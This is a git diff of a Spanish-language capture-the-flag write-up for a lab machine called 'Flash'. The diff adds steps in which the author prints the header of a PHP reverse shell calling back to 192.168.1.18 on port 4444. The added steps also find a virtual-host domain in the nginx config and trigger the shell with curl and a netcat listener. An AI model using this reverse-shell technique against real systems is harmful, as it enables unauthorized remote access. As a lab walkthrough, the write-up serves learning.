@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-06-06",
         "description": "Writeup Flash 🟢",
-        "wordCount":  798 ,
+        "wordCount":  888 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-06-06",
         "image": {
@@ -315,8 +315,24 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>Grabando a: «rs.php»
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>rs.php                     100%[=======================================&gt;]   3,45K  --.-KB/s    en 0s      
-</span></span></code></pre></div><p>Una vez he descargado <code>rs.php</code> mando una petición con curl</p>
+</span></span></code></pre></div><p>Una vez he descargado <code>rs.php</code> mando una petición con curl y sorpresa no me interpreta php.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>curl 192.168.1.14/rs.php
+</span></span><span style="display:flex;"><span>❯ curl 192.168.1.14/rs.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>set_time_limit (0);
+</span></span><span style="display:flex;"><span>$VERSION = &#34;1.0&#34;;
+</span></span><span style="display:flex;"><span>$ip = &#39;192.168.1.18&#39;;  // CHANGE THIS
+</span></span><span style="display:flex;"><span>$port = 4444;       // CHANGE THIS
+</span></span><span style="display:flex;"><span>$chunk_size = 1400;
+</span></span><span style="display:flex;"><span>$write_a = null;
+</span></span><span style="display:flex;"><span>$error_a = null;
+</span></span><span style="display:flex;"><span>$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+</span></span><span style="display:flex;"><span>$daemon = 0;
+</span></span><span style="display:flex;"><span>$debug = 0;
+</span></span></code></pre></div><p>Dentro del archivo <strong>default</strong> ubicado en <code>/etc/nginx/sites-available/</code> encuentro un nombre de dominio y este si interpreta php.</p>
+<p><img src="/../machines/nyx/flash/domain.nyx.webp" alt="domain"></p>
+<p>Agrego el nombre de dominio a mi archivo hosts y uso de nuevo curl para mandar una petición a <code>rs.php</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl http://loveyouuuuu.nyx/rs.php
 </span></span></code></pre></div><p>Obtengo la shell.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 4444
 </span></span><span style="display:flex;"><span>listening on [any] 4444 ...
